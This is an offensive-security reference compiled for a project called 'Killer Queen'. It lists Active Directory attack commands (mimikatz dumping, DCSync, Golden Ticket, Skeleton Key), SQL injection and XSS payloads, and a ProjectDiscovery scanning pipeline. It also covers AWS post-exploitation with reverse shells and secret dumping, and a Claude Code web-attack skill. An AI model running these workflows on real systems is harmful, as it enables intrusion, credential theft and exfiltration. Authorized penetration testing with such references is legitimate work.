# Killer Queen Tools & Techniques Reference

Consolidated from: The Hacker Recipes, ProjectDiscovery, Barq, Broxy, Prowler, and Awesome Web Security.

---

## 1. THE HACKER RECIPES (thehacker.recipes)

**What:** Free, open-source technical hacking guides — Active Directory, Web Services, Systems, Radio, Mobile. All tools available in Exegol (pentesting OS by same author @_nwodtuhs).

### 1a. Active Directory Techniques

#### Reconnaissance
- **Responder** — LLMNR/NBT-NS/mDNS poisoning to capture NTLM hashes
- **BloodHound** — AD graph analysis for attack paths (SharpHound/BloodHound.py collectors)
- **enum4linux** — SMB enumeration (users, shares, password policy)
- **LDAP** — Anonymous bind enumeration, custom queries
- **MS-RPC** — RPC enumeration without authentication

#### Credential Dumping (Prioritized — most valuable for lateral movement)
- **SAM & LSA** — Local account hashes via `reg save`, `secretsdump.py`
- **NTDS.dit** — Full domain database via `ntdsutil`, `vssadmin`, `diskshadow`
- **LSASS** — `mimikatz sekurlsa::logonpasswords`, `procdump` + offline extraction
- **DCSync** — `mimikatz lsadump::dcsync /user:DOMAIN\krbtgt` (needs Replication-Get-Changes rights)
- **DPAPI** — Browser credentials, saved passwords, certificates
- **GPP** — Decrypt `cpassword` from `SYSVOL\*\Groups.xml`
- **Kerberos key list** — Dump all Kerberos keys (AES256, AES128, RC4, DES)

#### Kerberos Attacks
- **ASREPRoast** — Request TGT for users with no pre-auth, crack session key offline. `GetNPUsers.py DOMAIN/user -no-pass`
- **Kerberoast** — Request ST for SPN accounts, crack offline. `GetUserSPNs.py DOMAIN/user -request`
- **Pass the Key / Overpass the Hash** — Use NT hash to request TGT (RC4). `mimikatz sekurlsa::pth`
- **Pass the Ticket** — Inject stolen TGT/ST. `mimikatz kerberos::ptt`
- **Silver Ticket** — Forge ST with service account hash (KRBTGT not needed). `mimikatz kerberos::golden /sid:DOMAIN_SID /target:server /service:cifs /rc4:SERVICE_HASH`
- **Golden Ticket** — Forge TGT with KRBTGT hash. `mimikatz kerberos::golden /domain:DOMAIN /sid:SID /rc4:KRBTGT_HASH /user:Administrator`
- **Diamond Ticket** — Modify legitimate TGT fields (no KRBTGT key needed if you have a real TGT + session key via DCSync)
- **S4U2self abuse** — Service requests ticket to itself on behalf of any user without SPN
- **Bronze Bit (CVE-2020-17049)** — Bypass constrained delegation restrictions
- **Shadow Credentials** — Add alternative key material to AD object for persistent auth
- **UnPAC the Hash** — Get NT hash from a PKINIT certificate authentication

#### NTLM Attacks
- **Capture** — Responder, Inveigh
- **Relay** — `ntlmrelayx.py` to SMB, LDAP, HTTP, MSSQL, IMAP
- **Pass the Hash** — `pth-winexe`, `crackmapexec smb target -u user -H HASH`

#### Coerced Authentications (force privileged accounts to authenticate to attacker)
- **PetitPotam** — MS-EFSRPC (EFS) coercion
- **PrinterBug** — MS-RPRN coercion via RpcRemoteFindFirstPrinterChangeNotification
- **ShadowCoerce** — MS-FSRVP coercion
- **DFSCoerce** — MS-DFSNM coercion
- **WebDAV/WebClient** — Force HTTP auth via `.search-ms` / `.library-ms` files
- **PushSubscription** — Windows Push Notification Platform coercion

#### AD-CS (Active Directory Certificate Services)
- **ESC1-ESC13** — Multiple privilege escalation paths via misconfigured templates
- **Certifried (CVE-2022-26923)** — Machine account privilege escalation
- **Pass the Certificate** — Authenticate with stolen certificate instead of hash/key

#### Persistence
- **DCShadow** — Rogue DC to push changes to AD
- **SID History** — Inject SIDs into tokens
- **Skeleton Key** — Patch LSASS to accept a master password
- **GoldenGMSA** — Compute GMSA passwords offline
- **AdminSDHolder** — ACL abuse for persistent admin rights

#### How Killer Queen Uses It:
- **Recon phase:** enum4linux + BloodHound collection for initial AD mapping
- **Initial compromise:** Responder in analysis mode, LLMNR poisoning
- **Escalation:** ASREPRoast → crack → BloodHound shortest path to DA
- **Lateral movement:** Pass-the-Hash to pivot, Kerberoast for service accounts
- **Persistence post-DA:** Golden Ticket + Skeleton Key + DCSync for regular hash harvest
- Use Exegol as the attack VM — all tools pre-installed

### 1b. Web Services Techniques

#### SQL Injection
```bash
# Manual detection — try special chars on every input
' " # ; ) * %  -- /*

# Union-based extraction
' ORDER BY 1--       # find column count
' UNION SELECT @@version,NULL--  # extract info
' UNION SELECT username,password FROM users--  # dump data

# Automated
sqlmap -u "$URL" -p parameter --all
sqlmap -r request.txt --level 2 --all
```

Key payloads to test: `' or '1'='1`, `' or 1=1 --`, `'='`, `1' or 1=1 -- -`

#### XSS (Cross-Site Scripting)
- **Stored** — payload persists in DB, hits all visitors
- **Reflected** — payload in URL parameter, reflected in response
- **DOM-based** — client-side JS manipulation

Bypass filters with: case variation, tag variants (`<IMG onerror=...>`, `<svg/onload=...>`), encoding tricks.

Tools: **XSStrike**, **XSSer**, **Dalfox** (Go, fastest).

Multi-purpose probe (simultaneously tests SQLi + XSS + SSTI):
```
'"<svg/onload=prompt(5);>{{7*7}}
```

#### Reconnaissance
- HTTP response headers, comments, error messages
- Directory fuzzing (ffuf, gobuster, dirsearch)
- Subdomain enumeration (subfinder, amass)
- WAF/CMS/technology fingerprinting (whatweb, wappalyzer)

#### How Killer Queen Uses It:
- Spray the multi-purpose probe across all form inputs and URL parameters
- If error or SQL syntax error: pivot to sqlmap
- If reflection: pivot to Dalfox/XSStrike for XSS
- If `{{7*7}}` renders as `49`: SSTI confirmed — pivot to tplmap

---

## 2. PROJECTDISCOVERY TOOLKIT

ProjectDiscovery provides a complete offensive security toolchain. Pipeline order matters.

### 2a. Subfinder — Passive Subdomain Enumeration

```bash
subfinder -d target.com -o subs.txt
subfinder -dL domains.txt -json -o subs.json
```

**Setup:** Configure API keys in `~/.config/subfinder/provider-config.yaml` for all passive sources (Shodan, Censys, VirusTotal, SecurityTrails, etc.).

**Killer Queen usage:** First step in recon. Feed output to httpx.

### 2b. Uncover — Host Discovery via Search Engines

```bash
uncover -q 'org:"Example Inc."' -e shodan,censys,fofa -limit 500
uncover -q 51.83.59.99/24                         # auto-uses Shodan-InternetDB
uncover -q "title:GitLab" -e shodan               # find GitLab instances
uncover -q example.com -f "https://ip:port"        # format output as URLs
uncover -q query.txt -e shodan,censys | httpx      # pipe to HTTP probe
```

**Supported engines:** Shodan, Censys, Fofa, ZoomEye, Quake, Hunter, Netlas, CriminalIP, Publicwww, Google, Onyphe, Driftnet, DayDayMap, NerdyData.

**Killer Queen usage:** External attack surface discovery before any active scanning.

### 2c. Naabu — Fast Port Scanner

```bash
naabu -host target.com -v                          # default SYN scan
naabu -host target.com -p 80,443,8080-8090         # specific ports
naabu -host target.com -top-ports 1000             # top 1000 ports
naabu -host target.com -p -                        # full 1-65535
naabu -host target.com -p u:53,161                 # UDP scan
naabu -list hosts.txt -rate 5000                   # bulk with rate limit
naabu -host target.com -sV                         # built-in service detection
naabu -host target.com -silent | httpx             # pipe to HTTP probing
naabu -host target.com -nmap-cli 'nmap -sV -A'     # nmap integration
```

**Killer Queen usage:** After subfinder/uncover, scan discovered hosts for open ports. Pipe to httpx.

### 2d. httpx — HTTP Probing Toolkit

```bash
httpx -l subs.txt -o alive.txt                     # probe which hosts serve HTTP
httpx -l subs.txt -sc -title -cl -wc -td           # status, title, content-length, word-count, tech-detect
httpx -l subs.txt -csp-probe -tls-probe            # CSP headers + TLS info
httpx -l subs.txt -favicon -jarm                   # favicon hash + JARM fingerprint
httpx -l subs.txt -screenshot                       # take screenshots
httpx -l subs.txt -vhost -path /admin              # virtual host discovery + path probing
httpx -l burp.xml -im burp                          # import burp suite logs
httpx -l subs.txt -sf secrets.yaml                  # auto auth (Basic, Bearer, Cookie, Header)
```

**Killer Queen usage:** Filter subfinder output to live web servers, extract tech stack, identify targets for nuclei.

### 2e. Katana — Web Crawler & Spider

```bash
katana -u https://target.com                       # standard crawl
katana -u https://target.com -headless              # browser-based crawl (JS rendering)
katana -u https://target.com -depth 5 -jc           # depth limit + JS file parsing
katana -u https://target.com -kf robotstxt,sitemapxml  # crawl known files
katana -u https://target.com -cs '.*\.target\.com/.*'  # in-scope regex
katana -u https://target.com -cos 'logout|signout'  # exclude patterns
katana -u https://target.com -aff                   # auto form fill & submit
katana -u https://target.com -headless -captcha-solver-provider capsolver -captcha-solver-key KEY
```

**Killer Queen usage:** Crawl target to discover endpoints for nuclei scanning. Headless mode for SPAs.

### 2f. Nuclei — Vulnerability Scanner

```bash
nuclei -u https://target.com                        # single target
nuclei -l alive.txt                                 # list of targets
nuclei -l alive.txt -t cves/ -severity critical,high # specific template dir + severity filter
nuclei -l alive.txt -tags xss,sqli,rce              # tag-based filtering
nuclei -l alive.txt -t custom-template.yaml         # custom template
nuclei -l alive.txt -as                             # automatic template selection
nuclei -l alive.txt -interactsh-url https://oast.pro # OOB detection via Interactsh
nuclei -l alive.txt -je report.json                 # JSON export
nuclei -l alive.txt -cloud-upload                   # upload to PD Cloud (free)
```

**Template library (12.5k+ stars):** Covers CVEs, default creds, misconfigurations, exposures, RCE, XSS, SQLi, SSRF, SSTI, LFI, open redirects, subdomain takeovers, and cloud misconfigs.

**Killer Queen usage:** The payload delivery mechanism. Run after httpx determines live hosts. Start broad (all templates), then narrow to high/critical, then custom templates for context-specific vulns.

### 2g. Interactsh — OOB Interaction Detector

```bash
interactsh-client                                  # get an OOB URL
interactsh-client -n 5                             # generate 5 payloads
interactsh-client -dns-only                        # only DNS interactions
interactsh-client -v -o logs.txt                   # verbose + log file
interactsh-client | notify                         # real-time alerts
```

**Self-hosting:**
```bash
interactsh-server -domain mydomain.com              # requires VPS + custom nameservers
```

**Protocols supported:** DNS, HTTP, HTTPS, SMTP, SMTPS, LDAP, NTLM, SMB, FTP(S).

**Killer Queen usage:** Essential for blind/out-of-band vulnerabilities. Generate payload, inject into SSRF/SQLi/XXE vectors, watch for callbacks.

### 2h. Vulnx — Vulnerability Data Explorer

Modern CLI for exploring CVEs and vulnerability intelligence with search, filter, and analysis.

### Complete Killer Queen Pipeline
```bash
# 1. Discover attack surface
subfinder -d target.com -o subs.txt
uncover -q 'org:"Target Inc."' -e shodan | tee -a ips.txt

# 2. Port scan
naabu -list ips.txt -top-ports 1000 -silent -o ports.txt

# 3. HTTP probe + tech detect
cat subs.txt | httpx -sc -title -tech-detect -o alive.txt

# 4. Crawl for endpoints
katana -list alive.txt -jc -kf robotstxt,sitemapxml -o endpoints.txt

# 5. Scan for vulnerabilities
nuclei -l endpoints.txt -severity critical,high,medium -interactsh-url https://oast.pro -o vulns.txt

# 6. OOB detection for blind vulns
interactsh-client &
# ... inject OOB payloads into blind SSRF/XXE/SQLi vectors
```

---

## 3. BARQ — AWS Cloud Post-Exploitation Framework

**What:** Python-based framework for attacking AWS infrastructure post-compromise. By @Voulnet.

### Key Capabilities
- **Attack EC2 without SSH keys** — Send msfvenom/Metasploit/Empire payloads to running instances using AWS API
- **Dump metadata** — Extract instance metadata (IAM credentials from IMDS)
- **Enumerate EC2** — List instances, security groups, AMIs
- **Dump secrets** — Extract stored AWS Secrets Manager entries and SSM Parameters
- **Key/Token support** — Use compromised access keys or tokens acquired from leaked source code or IMDS
- **Training mode** — Test attacks without affecting production
- **Tab-completion** — Menu-based CLI with auto-complete

### Prerequisites
- AWS access key ID + secret (and optionally session token)
- Python 2 or 3
- msfvenom in PATH (for payload generation)

### Key Commands
```bash
python barq.py                    # Launch interactive shell
python barq.py -help              # CLI flags
help                              # Show menu commands inside tool
```

### How Killer Queen Uses It:
- **Scenario:** Gained AWS credentials from a compromised web app or leaked source code
- **Step 1:** `barq.py` → enumerate all EC2 instances and security groups
- **Step 2:** Dump metadata from vulnerable instances for role credentials
- **Step 3:** Dump secrets (SSM parameters, Secrets Manager) for database passwords, API keys
- **Step 4:** Deploy reverse shells to EC2 instances without needing SSH keys
- **Step 5:** Use extracted credentials to pivot to other AWS services

**Planned future features:** Lambda/S3/RDS attacks, persistence, nmap export, full Metasploit/Empire REST API integration.

---

## 4. BROXY — HTTP/HTTPS Intercept Proxy

**What:** Open-source intercept proxy in Go. PoC that spawned the successor project **yves**.

### Features
- **Interceptor** — Capture, view, and modify HTTP/HTTPS requests in transit
- **History with filters** — Searchable request/response history
- **Repeater** — Resend and modify individual requests
- **Persistent sessions** — Save and restore proxy sessions

### Build
```bash
go get github.com/rhaidiz/broxy
cd $GOPATH/src/github.com/rhaidiz/broxy
make build                          # binary in deploy/ folder
# Requires: Go, Qt 5.13+, therecipe/qt wrapper
```

**Note:** Broxy is a PoC. The successor **yves** (github.com/rhaidiz/yves) is actively developed. Use yves for real engagements.

### How Killer Queen Uses It:
- **Alternative to Burp Suite** — lightweight intercept for manual web app testing
- **Session persistence** — useful for long-term engagements where you need to revisit/modify old requests
- Use for quick parameter manipulation, auth token inspection, and replay attacks

---

## 5. PROWLER — Multi-Cloud Security Platform

**What:** The world's most widely used open-source cloud security tool. Automates security and compliance across AWS, Azure, GCP, K8s, GitHub, M365, OCI, and more.

### Quick Stats
- **600+ AWS checks** across 84 services, 44 compliance frameworks
- **167 Azure checks**, 102 GCP, 83 K8s, 102 M365, 24 GitHub
- Official + unofficial providers: Cloudflare, MongoDB Atlas, Google Workspace, OpenStack, Vercel, Okta, Scaleway, NHN, Alibaba Cloud

### Key Commands
```bash
# Install
pip install prowler-cloud

# Basic scan
prowler aws                                      # full AWS scan
prowler aws --profile my-profile                  # specific AWS profile
prowler aws --region us-east-1,eu-west-1          # specific regions
prowler azure --subscription-id SUB_ID
prowler gcp --project-id PROJECT_ID
prowler kubernetes --kubeconfig ~/.kube/config

# Discovery
prowler aws --list-checks
prowler aws --list-services
prowler aws --list-compliance
prowler aws --list-categories

# Filtered scans
prowler aws --check check_name                    # single check
prowler aws --severity critical                   # severity filter
prowler aws --compliance cis_1.5_aws              # specific framework
prowler aws --category encryption                 # category filter

# Output formats
prowler aws -M csv -o output/
prowler aws -M json-asff -o output/               # AWS Security Hub format
prowler aws -M html -o output/                     # HTML report

# CI/CD
prowler aws --no-color -M csv --quiet              # CI-friendly output
```

### Attack Paths (AWS)
- Neo4j graph combining Cartography inventory + Prowler findings
- Visualize attack chains: exposed S3 → IAM role → EC2 access
- Auto-enqueued with every AWS scan

### Compliance Frameworks (AWS)
CIS, PCI-DSS, GDPR, HIPAA, SOC2, ISO 27001, NIST 800-53, FedRAMP, AWS Well-Architected, ENS, RBI, and 30+ more.

### How Killer Queen Uses It:
- **Cloud recon:** `prowler aws --list-checks | grep -i public` → find public exposure checks
- **Attack path discovery:** Run full AWS scan, review Neo4j attack paths for privilege escalation routes
- **Post-exploitation audit:** After compromising cloud creds, run Prowler to enumerate all misconfigurations exploitable from current position
- **Exfil targeting:** Look for "S3 bucket public" findings, "RDS public" — these are data extraction targets
- **Persistence:** Check IAM findings for roles that can be assumed, over-privileged users

---

## 6. AWESOME WEB SECURITY (qazbnm456/awesome-web-security)

**What:** Curated list of web security materials. Now serves as an AI skill for Claude Code/Codex — automatically activates on web-security topics (XSS, SQLi, SSRF, JWT, OAuth, recon, WAF evasion, deserialization, SAML, CTF write-ups).

### Key Categories & Top Resources

| Category | Best Tools / Resources |
|----------|----------------------|
| **XSS** | XSStrike, Dalfox, XSSer, PortSwigger Cheat Sheet, PayloadsAllTheThings |
| **SQL Injection** | SQLmap, SQLninja, PentestMonkey cheatsheets, PayloadsAllTheThings |
| **SSRF** | PayloadsAllTheThings SSRF, PortSwigger SSRF lab |
| **XXE** | PayloadsAllTheThings XXE, OWASP XXE Prevention |
| **CSRF** | Burp Suite CSRF PoC generator |
| **Web Cache Poisoning** | PortSwigger research by James Kettle |
| **JWT Attacks** | jwt_tool, jwt.io debugger, PortSwigger JWT lab |
| **OAuth** | OAuth 2.0 threat model, PortSwigger OAuth lab |
| **SAML** | SAML Raider (Burp extension), SAMLReQuest |
| **Deserialization** | ysoserial (Java), PHPGGC (PHP), ysoserial.net (.NET) |
| **Prototype Pollution** | PortSwigger research, client-side prototype pollution tools |
| **Subdomain Enumeration** | Subfinder, Amass, OneForAll, assetfinder |
| **WAF Evasion** | WAF bypass techniques, PayloadsAllTheThings WAF bypass |
| **CSP Bypass** | CSP Evaluator (Google), CSP bypass techniques |
| **OSINT** | theHarvester, SpiderFoot, Maltego, Shodan, Censys |

### Evasion Categories
- XXE evasion (encoding tricks, parameter entities, out-of-band)
- CSP bypass (JSONP endpoints, AngularJS sandbox escape, DOM clobbering)
- WAF evasion (encoding, case variation, chunking, parameter pollution)
- JSMVC evasion (AngularJS/React/Vue sandbox escapes)

### Tricks Categories
- RCE tricks (command injection, SSTI, file upload + LFI chain)
- CSRF tricks (JSON CSRF, flash-based CSRF)
- Deserialization tricks (gadget chains, blind deserialization)

### How Killer Queen Uses It:
- **Install as Claude Code skill:** `/plugin install awesome-web-security` — for on-demand web attack knowledge
- **Reference during engagements:** When encountering a specific vuln type (JWT, OAuth, deserialization), query the category for current best tools and bypass techniques
- **WAF bypass:** Pull evasion category when hitting 403/406 on payload delivery
- **Prioritized tools from each category** based on star count, community activity, and proven effectiveness

---

## QUICK-REFERENCE: KILLER QUEEN ATTACK WORKFLOWS

### External Web App Assault
```
subfinder → httpx → nuclei (broad) → katana (deep crawl) → nuclei (targeted) → interactsh (OOB)
```

### Cloud Compromise
```
Prowler (recon) → Barq (EC2 attack) → STS assume-role pivot → Terraform state dump → Secrets Manager exfil
```

### Internal AD Lateral Movement
```
Responder (sniff) → ASREPRoast (crack weak) → BloodHound (path) → Pass-the-Hash (pivot) → DCSync (dump domain)
```

### Blind Vulnerability Chain
```
Interactsh (payload gen) → inject into SSRF param → confirm OOB callback → pivot to internal network scan via SSRF
```

---

*Generated for Killer Queen knowledge base. All techniques require proper authorization on target systems.*
